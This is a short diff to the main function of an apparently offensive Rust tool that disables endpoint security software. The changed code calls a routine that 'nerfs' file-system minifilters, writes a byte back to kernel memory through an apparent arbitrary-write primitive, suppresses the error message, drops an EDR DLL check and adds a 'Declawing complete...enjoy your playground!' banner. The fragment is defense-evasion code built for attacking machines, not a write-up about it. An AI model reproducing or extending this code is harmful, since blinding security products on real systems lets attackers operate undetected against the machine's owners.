@@ -192,15 +192,12 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("[>] Targeting the file system minifilters.");
     match xp::nerf_fs_miniflts(fm_base as u64, fm_offsets) {
         Ok(_val) => {},
-        Err(e) => eprintln!("[-] FS miniflt nerfing failed: {:?}", e),
+        Err(_e) => {},
     }
 
-
-
     // =-=-> Clean up: Write 0x1 back to PM. Can't read it again! :D
+    println!("[>] Declawing complete! Restoring & cleaning up...enjoy your playground!");
     mem::write_byte(pm.unwrap() as usize as u64, 0x1);
-
-    utils::is_edr_dll_loaded(4);
 
     // Pause & exit
     println!("");
